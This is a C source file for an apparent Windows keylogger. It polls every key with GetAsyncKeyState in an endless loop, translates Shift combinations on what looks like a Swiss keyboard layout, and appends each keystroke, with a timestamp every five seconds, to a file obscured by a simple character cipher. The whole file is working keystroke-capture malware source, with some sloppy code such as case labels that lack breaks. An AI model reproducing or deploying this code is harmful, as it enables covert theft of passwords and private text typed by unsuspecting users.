#include "../include/keylogger.h"
#include "../include/encryption.h"
#include "../include/timestamp.h"
#include <stdio.h>
#include <stdbool.h>
#include <windows.h>
#include <time.h>  // Include time.h for time functions

void logKeystrokes(const char *filename, char key) {
    FILE *file;
    int keyState[256] = {0};  // Gets the state of the key according to AsCII values
    bool shiftPressed;
    int c;
    char timestamp[30];
    time_t lastTimestampTime = 0;

    // Open the file in append mode
    file = fopen(filename, "a");

    if (file == NULL) {
        printf("Error opening file for writing: %s\n", filename);
        return;
    }

    // Function to write a timestamp
    void writeTimestamp() {
        getCurrentTimestamp(timestamp, sizeof(timestamp));
        for (int i = 0; i < strlen(timestamp); i++) {
            char encryptedChar = encryptDecryptChar(timestamp[i], key);
            fputc(encryptedChar, file);
        }
        fflush(file);
    }

    // Write initial timestamp
    writeTimestamp();
    lastTimestampTime = time(NULL);

    // Endless loop to log keystrokes
    while (1) {
        // Add a timestamp every 5 seconds
        time_t currentTime = time(NULL);
        if (difftime(currentTime, lastTimestampTime) >= 5) {
            writeTimestamp();
            lastTimestampTime = currentTime;
        }

        // Check the state of the Shift key
        shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? true : false;

        // Iterate through all ASCII values
        for (c = 8; c <= 255; c++) {
            // Check if the key is currently pressed
            if (GetAsyncKeyState(c) & 0x8000) {
                if (keyState[c] == 0) {
                    keyState[c] = 1;  // Key is now pressed

                    // Process special characters and shift combinations
                    if (c >= 'A' && c <= 'Z') {
                        // Uppercase letters (with Shift key)
                        if (shiftPressed == false) {
                            c += 32;  // Convert to lowercase
                        }
                    } else if (c >= '0' && c <= '9') {
                        // Numbers and their Shift alternatives
                        if (shiftPressed == true) {
                            switch (c) {
                                case '1': c = '+'; break;
                                case '2': c = '"'; break;
                                case '3': c = '*'; break;
                                case '4': c = 'ç'; break;
                                case '5': c = '%'; break;
                                case '6': c = '&'; break;
                                case '7': c = '/'; break;
                                case '8': c = '('; break;
                                case '9': c = ')'; break;
                                case '0': c = '='; break;
                            }
                        }
                    } else {
                        // Special characters
                        if (shiftPressed == true) {
                            switch (c) {
                                case VK_OEM_PLUS: c = '*'; break;  // *
                                case VK_OEM_COMMA: c = ';'; break;  // ;
                                case VK_OEM_MINUS: c = '_'; break;  // _
                                case VK_OEM_PERIOD: c = ':'; break;  // :
                                case VK_SHIFT: c = ' ';
                                case VK_LSHIFT: c = ' ';
                                case VK_RSHIFT: c = ' ';
                            }
                        } else {
                            switch (c) {
                                case VK_OEM_PLUS: c = '+'; break;  // +
                                case VK_OEM_COMMA: c = ','; break;  // ,
                                case VK_OEM_MINUS: c = '-'; break;  // -
                                case VK_OEM_PERIOD: c = '.'; break;  // .     
                            }
                        }
                    }

                    // Special case: Enter key
                    if (c == VK_RETURN) {
                        char enterText[] = "|Enter|";
                        for (int i = 0; i < strlen(enterText); i++) {
                            char encryptedChar = encryptDecryptChar(enterText[i], key);
                            fputc(encryptedChar, file);
                        }
                    } else if (c == VK_BACK) {
                        char deleteText[] = "|Delete|";
                        for (int i = 0; i < strlen(deleteText); i++) {
                            char encryptedChar = encryptDecryptChar(deleteText[i], key);
                            fputc(encryptedChar, file);
                        }
                    } else {
                        // Encrypt character before writing to file
                        char encryptedChar = encryptDecryptChar((char)c, key);
                        fputc(encryptedChar, file);
                    }
                    fflush(file);
                }
            } else {
                keyState[c] = 0;  // Key is no longer pressed
            }
        }
        Sleep(10); // Short pause to reduce CPU load
    }

    // Close the file
    fclose(file);
}
